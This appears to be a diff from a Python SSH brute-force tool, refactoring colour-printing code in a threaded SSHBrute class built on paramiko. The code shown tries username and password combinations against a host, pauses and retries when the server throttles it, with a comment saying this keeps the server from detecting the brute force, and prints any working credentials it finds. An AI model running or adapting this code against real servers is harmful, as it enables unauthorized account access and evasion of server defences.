@@ -1,18 +1,9 @@
-# Python Script for SSH Brute Force
-
-# Importing Modules
 import threading
 import os
 import paramiko
 import socket
 import time
-from colorama import init, Fore
-
-init()
-GREEN = Fore.GREEN
-RED = Fore.RED
-RESET = Fore.RESET
-BLUE = Fore.BLUE
+from .misc import *
 
 
 class SSHBrute(threading.Thread):
@@ -30,7 +21,7 @@ class SSHBrute(threading.Thread):
             client.connect(hostname=hostname, username=username, password=password, timeout=3)
         except socket.timeout:
             # Do when host is unreachable
-            print(f"{RED}\n[SSH] Host: {hostname} is unreachable, timed out.{RESET}")
+            print(print_red(f"\n[!] [SSH] Host: {hostname} is unreachable, timed out."))
             return False
         except paramiko.AuthenticationException:
             # Do when username and password combination is incorrect
@@ -38,13 +29,13 @@ class SSHBrute(threading.Thread):
             return False
         except paramiko.SSHException:
             # Prevent server from detecting the brute force
-            print(f"{BLUE}\n[SSH] Quota exceeded, retrying with delay...{RESET}")
+            print(print_red(f"\n[!] [SSH] Quota exceeded, retrying with delay..."))
             # Sleep for a minute
             time.sleep(60)
             return self.ssh_brute(hostname, username, password)
         else:
             # Connection has been established
-            print(f"{GREEN}\n[SSH] Found combo:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
+            print(print_green(f"[!] \n[SSH] Found combo:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}"))
             return True
 
     def run(self):
